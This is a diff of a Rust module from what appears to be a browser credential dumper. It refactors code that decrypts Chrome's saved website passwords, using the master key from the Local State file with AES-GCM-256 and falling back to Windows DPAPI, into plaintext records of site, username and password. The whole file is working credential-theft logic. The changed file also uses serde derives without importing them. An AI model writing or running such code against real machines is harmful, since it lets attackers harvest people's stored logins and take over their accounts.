@@ -1,36 +1,56 @@
-use serde::Serialize;
-use winapi::um::dpapi::CryptUnprotectData;
-use winapi::um::wincrypt::{CRYPTOAPI_BLOB, DATA_BLOB};
-use winapi::um::winnt::LPWSTR;
+use crate::decryption_core::{aes_gcm_256, crypt_unprotect_data};
+use crate::dumper::DumperError;
 
-#[derive(Serialize, Debug)]
+#[derive(Debug, Deserialize)]
+pub struct LocalState<'a> {
+    #[serde(borrow)]
+    pub os_crypt: OsCrypt<'a>,
+}
+
+#[derive(Debug, Deserialize)]
+pub struct OsCrypt<'a> {
+    pub encrypted_key: &'a str,
+}
+
+#[derive(Debug, Clone)]
 pub struct ChromeAccount {
     pub website: String,
     pub username_value: String,
-    pub password_value: Vec<u8>,
+    pub encrypted_pwd: Vec<u8>,
 }
 
-#[derive(Serialize, Debug)]
+#[derive(Debug, Serialize, Clone)]
 pub struct DecryptedAccount {
     pub website: String,
     pub username_value: String,
-    pub decrypted_pwd: String,
+    pub pwd: String,
 }
 
 impl DecryptedAccount {
-    pub fn new(website: String, username_value: String, decrypted_pwd: String) -> Self {
-        DecryptedAccount {
-            website,
-            username_value,
-            decrypted_pwd,
+    pub fn from_chrome_acc(
+        mut chrome_acc: ChromeAccount,
+        master_key: Option<&mut [u8]>,
+    ) -> Result<DecryptedAccount, DumperError> {
+        match master_key {
+            Some(master_key) => {
+                let pwd_buf = chrome_acc.encrypted_pwd.as_slice();
+                let pwd = aes_gcm_256(master_key, pwd_buf)?;
+                Ok(DecryptedAccount {
+                    website: chrome_acc.website,
+                    username_value: chrome_acc.username_value,
+                    pwd,
+                })
+            }
+            None => {
+                let pwd_buf = crypt_unprotect_data(chrome_acc.encrypted_pwd.as_mut_slice())?;
+                let pwd = String::from_utf8(pwd_buf).map_err(|_| DumperError::FromUtf8Error)?;
+                Ok(DecryptedAccount {
+                    website: chrome_acc.website,
+                    username_value: chrome_acc.username_value,
+                    pwd,
+                })
+            }
         }
-    }
-}
-
-impl Into<DecryptedAccount> for ChromeAccount {
-    fn into(mut self) -> DecryptedAccount {
-        let decrypted = self.get_clear_text_pw();
-        DecryptedAccount::new(self.website, self.username_value, decrypted)
     }
 }
 
@@ -39,43 +59,13 @@ impl ChromeAccount {
         ChromeAccount {
             website,
             username_value,
-            password_value,
+            encrypted_pwd: password_value,
         }
     }
+}
 
-    fn get_clear_text_pw(&mut self) -> String {
-        unsafe {
-            let vec_ptr: *mut u8 = *&self.password_value.as_mut_ptr();
-            let vec_len: &usize = &self.password_value.len();
-            let mut data_in: DATA_BLOB = CRYPTOAPI_BLOB {
-                cbData: *vec_len as u32,
-                pbData: vec_ptr,
-            };
-
-            let mut data_out: DATA_BLOB = CRYPTOAPI_BLOB {
-                cbData: 0,
-                pbData: &mut 0,
-            };
-
-            let mut p_descr_out: LPWSTR = std::ptr::null_mut();
-
-            let succ_unprotect = CryptUnprotectData(
-                &mut data_in,
-                &mut p_descr_out,
-                std::ptr::null_mut(),
-                std::ptr::null_mut(),
-                std::ptr::null_mut(),
-                0,
-                &mut data_out,
-            );
-
-            if succ_unprotect == 0 {
-                panic!("Failed to decrypt! Exiting!");
-            }
-
-            let size = data_out.cbData as usize;
-
-            String::from_raw_parts(data_out.pbData, size, size)
-        }
+impl From<std::io::Error> for DumperError {
+    fn from(_: std::io::Error) -> Self {
+        DumperError::IoError
     }
 }
